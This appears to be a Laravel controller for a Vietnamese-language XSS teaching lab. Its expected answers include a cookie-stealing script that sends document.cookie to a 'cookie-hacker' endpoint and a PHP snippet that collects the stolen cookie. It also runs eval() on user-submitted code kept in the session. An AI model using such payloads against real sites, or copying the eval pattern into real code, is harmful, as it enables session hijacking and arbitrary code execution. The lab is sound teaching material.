<?php

namespace App\Http\Controllers;

use App\Http\Requests\Register;
use App\Repository\User\UserInterface;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class XssController extends Controller
{
    protected $userRepository;
    public function __construct(UserInterface $userRepository)
    {
        $this->userRepository = $userRepository;
    }
    public function showReflectedXss()
    {
        return view("show.xss.reflectedXss");
    }
    public function reset(){
        session()->flush();
        return redirect("action/xss/login");
    }
    public function getLogin()
    {
        if (Auth::check()) {
            Auth::logout();
        }
        return view("action.xss.login");
    }
    public function postLogin(Request $request)
    {
        $data = $request->all();
        if ($data) {
            $user = $this->userRepository->login($data);
            if ($user) {
                return true;
            }

        }
        return "Email or Password is not correct";
    }
    public function getRegister()
    {
        return view("action.xss.register");
    }
    public function postRegister(Register $request)
    {
        $data = $request->all();
        if ($data) {
            $user = $this->userRepository->create($data);
            if ($user) {
                return redirect("action/xss/login")->with("success", "Sign Up Successfully. Proceed To Login");
            }

        }
        return redirect()->back();
    }
    public function getLogout()
    {
        if (Auth::check()) {
            Auth::logout();
            return redirect('action/xss/login');
        }
        return redirect('action/xss/reflected-xss');
    }
    public function actionReflectedXss(Request $request)
    {
        $search = null;
        if(session("codePrevent")){
            $search = eval(session("codePrevent"));
        }
        elseif ($request->search) {
            $search = $request->search;
        }

        return view("action.xss.reflectedXss")->with(compact("search"));
    }
    public function getCodeHacker()
    {
        $name = 'takecookie.php';
        $action = 'action/xss/cookie-hacker';
        $code = "";
        if (session("codeHacker")) {
            $code = session("codeHacker");
        }

        return view('action.xss.code')->with(compact(['code', 'action', 'name']));
    }
    public function getCookieHacker(Request $request)
    {
        // request code
        $code = $request->code;
        if ($code) {
            $stringInput = preg_replace("/\s+/", '', $code);
            $codeTest = html_entity_decode(
                "if(isset(&#36;_GET['cookie']))
                {
                return &#36;_GET['cookie'];
                }"
            );
            $stringCode = preg_replace("/\s+/", '', $codeTest);
            session()->put("codeHacker", $code);
            if ($stringInput != $stringCode) {
                return redirect()->back()->with("fail", "Code của bạn không đúng với yêu cầu");
            } else {
                return redirect("action/xss/reflected-xss");
            }
        }
        // request cookie;
        elseif ($request->cookie) {
            $cookie = eval(session("codeHacker"));
            session()->put("cookie", $cookie);
        }
        else{
            return redirect()->back()->with("fail", "Code của bạn không đúng với yêu cầu");

        }
    }
    public function showCookieHacker()
    {
        $name = 'cookie.txt';
        $cookie = 'Không tìm thấy cookie';
        if (session("cookie")) {
            $cookie = session("cookie");
        }

        return view('action.xss.file')->with(compact(['cookie', 'name']));
    }
    public function getCodeScript()
    {
        $name = 'test.js';
        $action = 'action/xss/test-code-script';
        $code = "<script>window.open('http://localhost/action/xss/cookie-hacker?cookie='+);</script>";
        if (session('script')) {
            $code = session('script');
        }
        return view('action.xss.code')->with(compact(['code', 'action', 'name']));
    }
    public function testCodeScript(Request $request)
    {
        $codeTest = "<script>window.open('http://localhost/action/xss/cookie-hacker?cookie='+document.cookie);<script>";
        $stringCode = preg_replace("/\s+/", '', $codeTest);
        $code = $request->code;
        $stringInput = preg_replace("/\s+/", '', $code);
        session()->put("script", $code);
        if ($code && $stringInput != $stringCode) {
            return redirect()->back()->with("fail", "Code của bạn không đúng với yêu cầu");
        }
        return redirect("action/xss/reflected-xss");
    }
    public function showCodePrevent()
    {
        $name = 'PrenventXSS.php';
        $action = 'action/xss/get-code-prevent';
        $code = "";
        if (session("codePrevent")) {
            $code = session("codePrevent");
        }

        return view('action.xss.code')->with(compact(['code', 'action', 'name']));
    }
    public function getCodePrevent(Request $request)
    {
        // request code
        $code = $request->code;
        if ($code) {
            $stringInput = preg_replace("/\s+/", '', $code);
            $codeTest = html_entity_decode(
                "if(isset(&#36;_GET['search']))
                    return htmlspecialchars(&#36;_GET['search']);
                ");
            $stringCode = preg_replace("/\s+/", '', $codeTest);
            session()->put("codePrevent", $code);
            if ($stringInput != $stringCode) {
                return redirect()->back()->with("fail", "Code của bạn không đúng với yêu cầu");
            } else {
                return redirect("action/xss/reflected-xss");
            }
        }
        return redirect()->back()->with("fail", "Code của bạn không đúng với yêu cầu");

    }
}
